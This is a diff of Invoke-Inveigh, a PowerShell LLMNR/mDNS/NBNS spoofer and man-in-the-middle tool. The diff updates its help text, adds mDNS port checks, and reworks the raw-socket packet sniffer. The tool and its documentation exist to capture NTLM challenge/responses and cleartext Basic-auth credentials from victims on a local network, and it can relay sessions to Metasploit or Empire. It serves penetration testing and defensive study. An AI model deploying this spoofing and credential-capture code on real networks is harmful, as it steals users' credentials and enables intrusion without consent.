@@ -2,16 +2,17 @@ function Invoke-Inveigh
 {
 <#
 .SYNOPSIS
-Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP/HTTPS/Proxy/SMB.
+Invoke-Inveigh is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool with challenge/response
+capture over HTTP/HTTPS/Proxy/SMB.
 
 .DESCRIPTION
-Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with the following features:
+Invoke-Inveigh is a Windows PowerShell LLMNR/mDNS/NBNS spooferman-in-the-middle tool with the following features:
 
     IPv4 LLMNR/mDNS/NBNS spoofer with granular control
     NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/Proxy/SMB
     Basic auth cleartext credential capture over HTTP/HTTPS/Proxy
     WPAD server capable of hosting a basic or custom wpad.dat file
-    HTTP/HTTPS server capable of hosting limited content
+    HTTP/HTTPS/Proxy server capable of hosting limited content
     Granular control of console and file output
     Run time and run count control
     LLMNR/NBNS spoofer learning mode
@@ -21,8 +22,8 @@ Default = Random: 16 character hex NTLM challenge for use with the HTTP listener
 challenge will be generated for each request.
 
 .PARAMETER ConsoleOutput
-Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a shell, test to
-ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.
+Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a
+shell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.
 
 .PARAMETER ConsoleQueueLimit
 Default = Unlimited: Maximum number of queued up console log entries when not using the real time console. 
@@ -60,15 +61,15 @@ Default = Any: IP address for the HTTP/HTTPS listener.
 Default = 80: TCP port for the HTTP listener.
 
 .PARAMETER HTTPAuth
-Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS server authentication type. This setting does not apply to
-wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation. 
+Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS server authentication type. This setting does not
+apply to wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation. 
 
 .PARAMETER HTTPBasicRealm
 Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.
 
 .PARAMETER HTTPContentType
-Default = text/html: Content type for HTTP/HTTPS responses. Does not apply to EXEs and wpad.dat. Set to "application/hta"
-for HTA files or when using HTA code with HTTPResponse.
+Default = text/html: Content type for HTTP/HTTPS responses. Does not apply to EXEs and wpad.dat. Set to
+"application/hta" for HTA files or when using HTA code with HTTPResponse.
 
 .PARAMETER HTTPDir
 Full directory path to enable hosting of basic content through the HTTP/HTTPS listener.
@@ -99,7 +100,8 @@ Default = Inveigh: The issuer field for the cert that will be installed for HTTP
 Default = localhost: The subject field for the cert that will be installed for HTTPS.
 
 .PARAMETER HTTPSForceCertDelete
-Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and HTTPSCertSubject.
+Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and
+HTTPSCertSubject.
 
 .PARAMETER Inspect
 (Switch) Inspect LLMNR an NBNS traffic only. With elevated privilege, SMB must be disabled with -smb if you do not
@@ -107,8 +109,8 @@ want NTLMv1/NTLMv2 captures over SMB. Without elevated privilege, the desired in
 with -LLMNR and/or -NBNS.
 
 .PARAMETER IP
-Local IP address for listening and packet sniffing. This IP address will also be used for LLMNR/NBNS spoofing if the
-SpooferIP parameter is not set.
+Local IP address for listening and packet sniffing. This IP address will also be used for LLMNR/NBNS spoofing if
+the SpooferIP parameter is not set.
 
 .PARAMETER LogOutput
 Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.
@@ -123,7 +125,7 @@ Default = 30 Seconds: LLMNR TTL in seconds for the response packet.
 Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.
 
 .PARAMETER mDNS
-Default = Disabled: (Y/N) Enable/Disable mDNS QU spoofing.
+Default = Disabled: (Y/N) Enable/Disable mDNS spoofing.
 
 .PARAMETER mDNSTTL
 Default = 120 Seconds: mDNS TTL in seconds for the response packet.
@@ -239,8 +241,9 @@ PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and 
 0 = None, 1 = Metasploit/Meterpreter, 2 = Empire   
 
 .PARAMETER WPADAuth
-Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
-Anonymous can prevent browser login prompts. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation.
+Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS server authentication type for wpad.dat requests.
+Setting to Anonymous can prevent browser login prompts. NTLMNoESS turns off the 'Extended Session Security' flag
+during negotiation.
 
 .PARAMETER WPADAuthIgnore
 Default = Disabled: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
@@ -296,18 +299,6 @@ useful for sending traffic to a controlled Linux system on another subnet.
 .EXAMPLE
 Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
 Execute specifying an HTTP redirect response. 
-
-.NOTES
-1. An elevated administrator or SYSTEM shell is needed for some features.
-2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/HTTPS/SMB NTLMv1/NTLMv2 challenge/response capture.
-3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
-4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
-5. HTTP challenge/response captures are performed with a dedicated listener.
-6. The local LLMNR/NBNS services do not need to be disabled on the host system.
-7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
-8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
-9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
-10. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
 
 .LINK
 https://github.com/Kevin-Robertson/Inveigh
@@ -471,8 +462,6 @@ if($inveigh.running)
     throw
 }
 
-$inveigh.sniffer_socket = $null
-
 if($HTTP_listener.IsListening -and !$inveigh.relay_running)
 {
     $HTTP_listener.Stop()
@@ -545,6 +534,11 @@ if($StartupChecks -eq 'Y')
         $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
     }
 
+    if($mDNS -eq 'Y' -and !$elevated_privilege)
+    {
+        $mDNS_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
+    }
+
 }
 
 if(!$elevated_privilege)
@@ -562,6 +556,7 @@ if(!$elevated_privilege)
         throw
     }
 
+    $NBNS = "Y"
     $SMB = "N"
 
 }
@@ -722,19 +717,30 @@ else
 
 if($mDNS -eq 'Y')
 {
-    $mDNS_response_message = "- response sent"
-    $mDNSTypes_output = $mDNSTypes -join ","
-    
-    if($mDNSTypes.Count -eq 1)
+
+    if($elevated_privilege -or !$mDNS_port_check)
     {
-        $inveigh.status_queue.Add("mDNS Spoofer For Type $mDNSTypes_output = Enabled")  > $null
+        $inveigh.status_queue.Add("mDNS Spoofer = Enabled")  > $null
+        $inveigh.status_queue.Add("mDNS TTL = $mDNSTTL Seconds")  > $null
+        $mDNSTypes_output = $mDNSTypes -join ","
+        $mDNS_response_message = "- response sent"
+
+        if($mDNSTypes.Count -eq 1)
+        {
+            $inveigh.status_queue.Add("mDNS Spoofer For Type $mDNSTypes_output = Enabled")  > $null
+        }
+        else
+        {
+            $inveigh.status_queue.Add("mDNS Spoofer For Types $mDNSTypes_output = Enabled")  > $null
+        }
+
     }
     else
     {
-        $inveigh.status_queue.Add("mDNS Spoofer For Types $mDNSTypes_output = Enabled")  > $null
+        $mDNS = "N"
+        $inveigh.status_queue.Add("mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
     }
 
-    $inveigh.status_queue.Add("mDNS TTL = $mDNSTTL Seconds")  > $null
 }
 else
 {
@@ -1961,7 +1967,7 @@ $HTTP_scriptblock =
                     {
                         [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                     }
-                    elseif($HTTPDefaultFile -and $HTTP_request_raw_url -eq '' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)))
+                    elseif(($HTTPDefaultFile -and $HTTP_request_raw_url -eq '' -or $HTTPDefaultFile -and $HTTP_request_raw_url -eq '/') -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)))
                     {
                         [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                     }
@@ -2107,10 +2113,9 @@ $sniffer_scriptblock =
     $byte_in[1-3] = 0
     $byte_out[0] = 1
     $byte_out[1-3] = 0
-    $inveigh.sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
-    $inveigh.sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
-    $inveigh.sniffer_socket.ReceiveBufferSize = 4096
-    $end_point = New-Object System.Net.IPEndpoint([System.Net.IPAddress]"$IP",0)
+    $sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
+    $sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
+    $sniffer_socket.ReceiveBufferSize = 4096
 
     try
     {
@@ -2133,8 +2138,8 @@ $sniffer_scriptblock =
 
     }
 
-    $inveigh.sniffer_socket.Bind($end_point)
-    $inveigh.sniffer_socket.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
+    $sniffer_socket.Bind($end_point)
+    $sniffer_socket.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
     $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
     [Array]::Reverse($LLMNR_TTL_bytes)
     $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)
@@ -2152,15 +2157,15 @@ $sniffer_scriptblock =
 
     while($inveigh.running -and $sniffer_running)
     {
-        $packet_data = $inveigh.sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
+        $packet_data = $sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
         $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_data)
         $binary_reader = New-Object System.IO.BinaryReader($memory_stream)
         $version_HL = $binary_reader.ReadByte()
-        $binary_reader.ReadByte()
+        $binary_reader.ReadByte() > $null
         $total_length = DataToUInt16 $binary_reader.ReadBytes(2)
-        $binary_reader.ReadBytes(5)
+        $binary_reader.ReadBytes(5) > $null
         $protocol_number = $binary_reader.ReadByte()
-        $binary_reader.ReadBytes(2)
+        $binary_reader.ReadBytes(2) > $null
         $source_IP_bytes = $binary_reader.ReadBytes(4)
         $source_IP = [System.Net.IPAddress]$source_IP_bytes
         $destination_IP_bytes = $binary_reader.ReadBytes(4)
@@ -2169,14 +2174,14 @@ $sniffer_scriptblock =
         
         switch($protocol_number)
         {
-
+            
             6 
             {  # TCP
                 $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                 $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
-                $binary_reader.ReadBytes(16)
+                $binary_reader.ReadBytes(8) > $null
                 $TCP_header_length = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
-                $binary_reader.ReadBytes(7)
+                $binary_reader.ReadBytes(7) > $null
                 $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
 
                 switch ($destination_port)
@@ -2259,7 +2264,7 @@ $sniffer_scriptblock =
                 $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                 $UDP_length = $binary_reader.ReadBytes(2)
                 $UDP_length_uint  = DataToUInt16 ($UDP_length)
-                $binary_reader.ReadBytes(2)
+                $binary_reader.ReadBytes(2) > $null
                 $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)
 
                 # Incoming packets 
